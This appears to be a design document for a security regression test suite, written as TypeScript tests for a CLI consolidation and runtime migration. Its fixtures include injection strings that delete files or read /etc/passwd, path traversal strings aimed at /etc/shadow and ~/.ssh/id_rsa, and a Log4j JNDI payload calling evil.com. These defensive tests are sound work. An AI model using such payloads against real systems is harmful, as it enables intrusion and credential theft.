# Security Regression Test Suite - CLI Consolidation

## Executive Summary

**Test Suite Status**: 🔧 **COMPREHENSIVE SECURITY TESTING FRAMEWORK**  
**Coverage**: **CLI Security, Runtime Migration, Vulnerability Prevention**  
**Purpose**: **Ensure no security regressions during Phase 2 consolidation**

This test suite provides comprehensive security validation for the CLI consolidation and runtime migration to prevent security regressions and validate security controls.

## Test Framework Architecture

### Security Test Categories

```typescript
interface SecurityTestSuite {
  inputValidation: InputValidationTests;
  commandInjection: CommandInjectionTests;
  pathTraversal: PathTraversalTests;
  permissionValidation: PermissionValidationTests;
  dependencySecurity: DependencySecurityTests;
  runtimeSecurity: RuntimeSecurityTests;
  networkSecurity: NetworkSecurityTests;
  fileSystemSecurity: FileSystemSecurityTests;
}
```

### Test Execution Framework
```typescript
interface SecurityTest {
  id: string;
  name: string;
  category: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  description: string;
  execute(): Promise<SecurityTestResult>;
  cleanup?(): Promise<void>;
}

interface SecurityTestResult {
  passed: boolean;
  vulnerabilityFound: boolean;
  details: string;
  evidence?: any;
  remediation?: string;
}
```

## 1. Command Injection Security Tests

### Test Suite: Command Injection Prevention
```typescript
class CommandInjectionTests {
  
  // Test 1: Basic Command Injection
  async testBasicCommandInjection(): Promise<SecurityTestResult> {
    const maliciousInputs = [
      "'; rm -rf /tmp/test; echo 'injected",
      '"; cat /etc/passwd; echo "',
      '$(malicious_command)',
      '`backdoor_execution`',
      '| malicious_pipe',
      '&& dangerous_command',
      '; malicious; #'
    ];
    
    for (const input of maliciousInputs) {
      try {
        // Test CLI with malicious input
        const result = await this.executeCLICommand('swarm', [input]);
        
        if (this.containsEvidenceOfExecution(result)) {
          return {
            passed: false,
            vulnerabilityFound: true,
            details: `Command injection successful with input: ${input}`,
            evidence: result,
            remediation: 'Replace execSync with spawn() and disable shell interpretation'
          };
        }
      } catch (error) {
        // Expected behavior - command should be rejected
        console.log(`✅ Correctly rejected malicious input: ${input}`);
      }
    }
    
    return {
      passed: true,
      vulnerabilityFound: false,
      details: 'All command injection attempts were properly blocked'
    };
  }
  
  // Test 2: Shell Metacharacter Injection
  async testShellMetacharacterInjection(): Promise<SecurityTestResult> {
    const shellMetacharacters = [
      '|', '&', ';', '(', ')', '<', '>', 
      '`', '$', '*', '?', '[', ']', '!', '#'
    ];
    
    for (const char of shellMetacharacters) {
      const maliciousCommand = `test${char}malicious`;
      
      try {
        await this.executeCLICommand('swarm', [maliciousCommand]);
        
        // Check if shell interpretation occurred
        if (await this.detectShellInterpretation(maliciousCommand)) {
          return {
            passed: false,
            vulnerabilityFound: true,
            details: `Shell metacharacter injection with: ${char}`,
            remediation: 'Disable shell interpretation in spawn() calls'
          };
        }
      } catch (error) {
        // Expected - should reject dangerous characters
      }
    }
    
    return { passed: true, vulnerabilityFound: false, details: 'Shell metacharacters properly escaped' };
  }
  
  // Test 3: Environment Variable Injection
  async testEnvironmentVariableInjection(): Promise<SecurityTestResult> {
    const maliciousEnvVars = {
      'NODE_OPTIONS': '--inspect=0.0.0.0:9229',
      'LD_PRELOAD': '/tmp/malicious.so',
      'PATH': '/tmp/malicious:/usr/bin',
      'SHELL': '/tmp/malicious_shell'
    };
    
    for (const [key, value] of Object.entries(maliciousEnvVars)) {
      const originalValue = process.env[key];
      
      try {
        process.env[key] = value;
        await this.executeCLICommand('status', []);
        
        // Check if malicious environment variable was used
        if (await this.detectMaliciousEnvUsage(key, value)) {
          return {
            passed: false,
            vulnerabilityFound: true,
            details: `Environment variable injection via ${key}`,
            remediation: 'Sanitize environment variables before process spawning'
          };
        }
      } finally {
        // Restore original value
        if (originalValue) {
          process.env[key] = originalValue;
        } else {
          delete process.env[key];
        }
      }
    }
    
    return { passed: true, vulnerabilityFound: false, details: 'Environment variables properly sanitized' };
  }
}
```

## 2. Path Traversal Security Tests

### Test Suite: Path Traversal Prevention
```typescript
class PathTraversalTests {
  
  // Test 1: Directory Traversal
  async testDirectoryTraversal(): Promise<SecurityTestResult> {
    const traversalPatterns = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/shadow',
      '~/../../etc/hosts',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',  // URL encoded
      '....//....//....//etc/passwd',              // Double encoding
      '..\\..\\..\\..\\.\\windows\\system32'
    ];
    
    for (const pattern of traversalPatterns) {
      try {
        // Test CLI commands that accept file paths
        const commands = [
          ['config', '--file', pattern],
          ['memory', '--export', pattern],
          ['init', '--config', pattern]
        ];
        
        for (const [command, ...args] of commands) {
          const result = await this.executeCLICommand(command, args);
          
          if (await this.detectUnauthorizedFileAccess(pattern, result)) {
            return {
              passed: false,
              vulnerabilityFound: true,
              details: `Path traversal successful: ${pattern}`,
              evidence: result,
              remediation: 'Implement strict path validation and canonicalization'
            };
          }
        }
      } catch (error) {
        // Expected - should reject dangerous paths
        console.log(`✅ Correctly rejected traversal attempt: ${pattern}`);
      }
    }
    
    return { passed: true, vulnerabilityFound: false, details: 'All path traversal attempts blocked' };
  }
  
  // Test 2: Symlink Following
  async testSymlinkFollowing(): Promise<SecurityTestResult> {
    const tempDir = '/tmp/security-test';
    const sensitiveFile = '/etc/passwd';
    const symlinkPath = `${tempDir}/malicious_symlink`;
    
    try {
      // Create test environment
      await fs.mkdir(tempDir, { recursive: true });
      await fs.symlink(sensitiveFile, symlinkPath);
      
      // Test if CLI follows symlinks to sensitive files
      const result = await this.executeCLICommand('config', ['--file', symlinkPath]);
      
      if (await this.detectSensitiveFileAccess(result)) {
        return {
          passed: false,
          vulnerabilityFound: true,
          details: 'CLI follows symlinks to sensitive files',
          remediation: 'Implement symlink validation or disable symlink following'
        };
      }
    } finally {
      // Cleanup
      await fs.unlink(symlinkPath).catch(() => {});
      await fs.rmdir(tempDir).catch(() => {});
    }
    
    return { passed: true, vulnerabilityFound: false, details: 'Symlink following properly restricted' };
  }
}
```

## 3. Input Validation Security Tests

### Test Suite: Input Validation
```typescript
class InputValidationTests {
  
  // Test 1: CLI Argument Validation
  async testCLIArgumentValidation(): Promise<SecurityTestResult> {
    const maliciousInputs = [
      'A'.repeat(10000),                    // Buffer overflow attempt
      '\x00\x01\x02\x03',                  // Binary data
      '<script>alert("xss")</script>',     // XSS payload
      '${jndi:ldap://evil.com}',           // Log4j injection
      '\n\r\t\0',                         // Control characters
      '../../etc/passwd\0.txt'             // Null byte injection
    ];
    
    const testCommands = ['sparc', 'swarm', 'agent', 'config', 'memory'];
    
    for (const command of testCommands) {
      for (const input of maliciousInputs) {
        try {
          const result = await this.executeCLICommand(command, [input]);
          
          // Check for evidence of improper handling
          if (await this.detectImproperInputHandling(input, result)) {
            return {
              passed: false,
              vulnerabilityFound: true,
              details: `Input validation failure for command: ${command}`,
              evidence: { command, input, result },
              remediation: 'Implement comprehensive input validation and sanitization'
            };
          }
        } catch (error) {
          // Expected for malicious inputs
        }
      }
    }
    
    return { passed: true, vulnerabilityFound: false, details: 'Input validation working correctly' };
  }
  
  // Test 2: Configuration File Validation
  async testConfigurationValidation(): Promise<SecurityTestResult> {
    const maliciousConfigs = [
      {
        name: 'command_injection.json',
        content: JSON.stringify({
          command: "$(malicious_command)",
          script: "; rm -rf /tmp/*"
        })
      },
      {
        name: 'path_traversal.json',
        content: JSON.stringify({
          logFile: "../../etc/passwd",
          configPath: "../../../home/user/.ssh/id_rsa"
        })
      },
      {
        name: 'oversized.json',
        content: JSON.stringify({
          data: 'A'.repeat(1000000)  // Large payload
        })
      }
    ];
    
    for (const config of maliciousConfigs) {
      const tempConfigPath = `/tmp/${config.name}`;
      
      try {
        await fs.writeFile(tempConfigPath, config.content);
        const result = await this.executeCLICommand('config', ['--file', tempConfigPath]);
        
        if (await this.detectMaliciousConfigProcessing(result)) {
          return {
            passed: false,
            vulnerabilityFound: true,
            details: `Malicious configuration processed: ${config.name}`,
            remediation: 'Implement strict configuration validation'
          };
        }
      } finally {
        await fs.unlink(tempConfigPath).catch(() => {});
      }
    }
    
    return { passed: true, vulnerabilityFound: false, details: 'Configuration validation working correctly' };
  }
}
```

## 4. Permission Validation Tests

### Test Suite: Permission System Validation
```typescript
class PermissionValidationTests {
  
  // Test 1: Network Permission Enforcement
  async testNetworkPermissionEnforcement(): Promise<SecurityTestResult> {
    const testCases = [
      {
        allowedHosts: ['api.example.com'],
        testURL: 'https://malicious.com/data',
        shouldAllow: false
      },
      {
        allowedHosts: ['api.example.com'],
        testURL: 'https://api.example.com/data',
        shouldAllow: true
      },
      {
        allowedHosts: [],
        testURL: 'https://google.com',
        shouldAllow: false
      }
    ];
    
    for (const testCase of testCases) {
      const securityManager = new ApplicationSecurityManager({
        network: {
          enabled: true,
          allowedHosts: testCase.allowedHosts,
          allowedPorts: [80, 443],
          protocols: ['https']
        }
      });
      
      try {
        await securityManager.checkNetworkAccess(testCase.testURL);
        
        if (!testCase.shouldAllow) {
          return {
            passed: false,
            vulnerabilityFound: true,
            details: `Network access incorrectly allowed to: ${testCase.testURL}`,
            remediation: 'Fix network permission validation logic'
          };
        }
      } catch (error) {
        if (testCase.shouldAllow) {
          return {
            passed: false,
            vulnerabilityFound: true,
            details: `Network access incorrectly denied to: ${testCase.testURL}`,
            remediation: 'Fix network permission validation logic'
          };
        }
      }
    }
    
    return { passed: true, vulnerabilityFound: false, details: 'Network permissions working correctly' };
  }
  
  // Test 2: File System Permission Enforcement
  async testFileSystemPermissionEnforcement(): Promise<SecurityTestResult> {
    const testCases = [
      {
        allowedPaths: ['./config'],
        testPath: './config/app.json',
        operation: 'read' as const,
        shouldAllow: true
      },
      {
        allowedPaths: ['./config'],
        testPath: '/etc/passwd',
        operation: 'read' as const,
        shouldAllow: false
      },
      {
        allowedPaths: ['./logs'],
        testPath: './logs/app.log',
        operation: 'write' as const,
        shouldAllow: true
      },
      {
        allowedPaths: ['./logs'],
        testPath: '/etc/hosts',
        operation: 'write' as const,
        shouldAllow: false
      }
    ];
    
    for (const testCase of testCases) {
      const securityManager = new ApplicationSecurityManager({
        filesystem: {
          read: testCase.operation === 'read' ? testCase.allowedPaths : [],
          write: testCase.operation === 'write' ? testCase.allowedPaths : [],
          execute: []
        }
      });
      
      try {
        securityManager.checkFileAccess(testCase.testPath, testCase.operation);
        
        if (!testCase.shouldAllow) {
          return {
            passed: false,
            vulnerabilityFound: true,
            details: `File access incorrectly allowed: ${testCase.testPath}`,
            remediation: 'Fix file system permission validation'
          };
        }
      } catch (error) {
        if (testCase.shouldAllow) {
          return {
            passed: false,
            vulnerabilityFound: true,
            details: `File access incorrectly denied: ${testCase.testPath}`,
            remediation: 'Fix file system permission validation'
          };
        }
      }
    }
    
    return { passed: true, vulnerabilityFound: false, details: 'File system permissions working correctly' };
  }
}
```

## 5. Dependency Security Tests

### Test Suite: Dependency Vulnerability Scanning
```typescript
class DependencySecurityTests {
  
  // Test 1: Known Vulnerability Detection
  async testKnownVulnerabilityDetection(): Promise<SecurityTestResult> {
    const knownVulnerablePackages = [
      { name: 'cross-spawn', version: '<6.0.6', cve: 'GHSA-3xgq-45jj-v275' },
      { name: 'pkg', version: '*', cve: 'GHSA-22r3-9w55-cj54' }
    ];
    
    for (const pkg of knownVulnerablePackages) {
      if (await this.isPackageInstalled(pkg.name, pkg.version)) {
        return {
          passed: false,
          vulnerabilityFound: true,
          details: `Known vulnerable package detected: ${pkg.name} (${pkg.cve})`,
          remediation: `Update ${pkg.name} to latest secure version`
        };
      }
    }
    
    return { passed: true, vulnerabilityFound: false, details: 'No known vulnerable packages detected' };
  }
  
  // Test 2: Dependency Integrity Validation
  async testDependencyIntegrityValidation(): Promise<SecurityTestResult> {
    const criticalPackages = [
      'commander', 'express', 'chalk', 'inquirer'
    ];
    
    for (const packageName of criticalPackages) {
      const integrity = await this.checkPackageIntegrity(packageName);
      
      if (!integrity.valid) {
        return {
          passed: false,
          vulnerabilityFound: true,
          details: `Package integrity check failed: ${packageName}`,
          evidence: integrity,
          remediation: 'Reinstall package from trusted source'
        };
      }
    }
    
    return { passed: true, vulnerabilityFound: false, details: 'Package integrity checks passed' };
  }
  
  // Test 3: Supply Chain Security
  async testSupplyChainSecurity(): Promise<SecurityTestResult> {
    const suspiciousPatterns = [
      /eval\s*\(/,                    // Dynamic code execution
      /Function\s*\(/,                // Function constructor
      /require\s*\(\s*['"`][^'"`]*['"`]\s*\)/,  // Dynamic requires
      /process\.env/,                 // Environment access
      /child_process/,                // Process spawning
      /fs\.(read|write|unlink)/       // File system operations
    ];
    
    const packageSourceCode = await this.getInstalledPackageSourceCode();
    
    for (const [packageName, sourceCode] of Object.entries(packageSourceCode)) {
      for (const pattern of suspiciousPatterns) {
        if (pattern.test(sourceCode)) {
          console.warn(`⚠️  Suspicious pattern in ${packageName}: ${pattern}`);
        }
      }
    }
    
    return { passed: true, vulnerabilityFound: false, details: 'Supply chain analysis completed' };
  }
}
```

## 6. Runtime Security Tests

### Test Suite: Runtime Migration Security
```typescript
class RuntimeSecurityTests {
  
  // Test 1: Permission Model Comparison
  async testPermissionModelComparison(): Promise<SecurityTestResult> {
    const permissionTests = [
      {
        operation: 'network_access',
        deno_required: '--allow-net',
        node_behavior: 'unrestricted'
      },
      {
        operation: 'file_read',
        deno_required: '--allow-read',
        node_behavior: 'unrestricted'
      },
      {
        operation: 'process_spawn',
        deno_required: '--allow-run',
        node_behavior: 'unrestricted'
      }
    ];
    
    const failedControls = [];
    
    for (const test of permissionTests) {
      if (test.node_behavior === 'unrestricted') {
        // Check if compensating controls are in place
        const hasCompensatingControl = await this.checkCompensatingControl(test.operation);
        
        if (!hasCompensatingControl) {
          failedControls.push(test.operation);
        }
      }
    }
    
    if (failedControls.length > 0) {
      return {
        passed: false,
        vulnerabilityFound: true,
        details: `Missing compensating controls for: ${failedControls.join(', ')}`,
        remediation: 'Implement application-level permission controls'
      };
    }
    
    return { passed: true, vulnerabilityFound: false, details: 'Permission model migration validated' };
  }
  
  // Test 2: Security Boundary Validation
  async testSecurityBoundaryValidation(): Promise<SecurityTestResult> {
    const securityBoundaries = [
      'network_isolation',
      'filesystem_isolation', 
      'process_isolation',
      'environment_isolation'
    ];
    
    for (const boundary of securityBoundaries) {
      const isEnforced = await this.validateSecurityBoundary(boundary);
      
      if (!isEnforced) {
        return {
          passed: false,
          vulnerabilityFound: true,
          details: `Security boundary not enforced: ${boundary}`,
          remediation: `Implement ${boundary} controls`
        };
      }
    }
    
    return { passed: true, vulnerabilityFound: false, details: 'Security boundaries properly enforced' };
  }
}
```

## Test Execution Framework

### Automated Test Runner
```typescript
class SecurityTestRunner {
  private testSuites: SecurityTest[] = [];
  
  registerTestSuite(suite: SecurityTest[]): void {
    this.testSuites.push(...suite);
  }
  
  async runAllTests(): Promise<SecurityTestReport> {
    const report: SecurityTestReport = {
      timestamp: new Date(),
      totalTests: this.testSuites.length,
      passed: 0,
      failed: 0,
      vulnerabilitiesFound: 0,
      results: []
    };
    
    for (const test of this.testSuites) {
      console.log(`🔍 Running security test: ${test.name}`);
      
      try {
        const result = await test.execute();
        
        if (result.passed) {
          report.passed++;
          console.log(`✅ ${test.name}: PASSED`);
        } else {
          report.failed++;
          console.log(`❌ ${test.name}: FAILED`);
          
          if (result.vulnerabilityFound) {
            report.vulnerabilitiesFound++;
            console.log(`🚨 VULNERABILITY DETECTED: ${result.details}`);
          }
        }
        
        report.results.push({
          testId: test.id,
          testName: test.name,
          category: test.category,
          result
        });
        
        // Cleanup if needed
        if (test.cleanup) {
          await test.cleanup();
        }
        
      } catch (error) {
        report.failed++;
        console.error(`💥 Test execution error: ${test.name}`, error);
        
        report.results.push({
          testId: test.id,
          testName: test.name,
          category: test.category,
          result: {
            passed: false,
            vulnerabilityFound: false,
            details: `Test execution failed: ${error.message}`
          }
        });
      }
    }
    
    return report;
  }
  
  generateSecurityReport(report: SecurityTestReport): string {
    return `
# Security Test Report

**Execution Time**: ${report.timestamp.toISOString()}
**Total Tests**: ${report.totalTests}
**Passed**: ${report.passed}
**Failed**: ${report.failed}
**Vulnerabilities Found**: ${report.vulnerabilitiesFound}

## Security Status
${report.vulnerabilitiesFound === 0 ? '✅ No security vulnerabilities detected' : `🚨 ${report.vulnerabilitiesFound} security vulnerabilities found`}

## Test Results
${report.results.map(r => `- ${r.result.passed ? '✅' : '❌'} ${r.testName}`).join('\n')}

## Failed Tests
${report.results.filter(r => !r.result.passed).map(r => `
### ${r.testName}
**Category**: ${r.category}
**Details**: ${r.result.details}
**Remediation**: ${r.result.remediation || 'See security documentation'}
`).join('\n')}
    `;
  }
}
```

### CI/CD Integration
```yaml
# .github/workflows/security-tests.yml
name: Security Regression Tests
on: [push, pull_request]

jobs:
  security-tests:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
          
      - name: Install Dependencies
        run: npm ci
        
      - name: Run Security Tests
        run: npm run test:security
        
      - name: Run Dependency Audit
        run: npm audit --audit-level high
        
      - name: Upload Security Report
        uses: actions/upload-artifact@v3
        with:
          name: security-report
          path: security-report.html
```

## Usage Instructions

### Running Security Tests
```bash
# Run all security tests
npm run test:security

# Run specific test category
npm run test:security -- --category=command-injection

# Run tests with verbose output
npm run test:security -- --verbose

# Generate security report
npm run security:report
```

### Continuous Security Monitoring
```bash
# Daily security scans
cron schedule: "0 2 * * *"
command: npm run test:security && npm audit

# Pre-commit security checks
git hook: pre-commit
command: npm run test:security:fast
```

---

**Security Test Suite**: Security Reviewer Agent  
**Framework Version**: 1.0.0  
**Last Updated**: 2025-06-27  
**Status**: 🔧 **Ready for Implementation**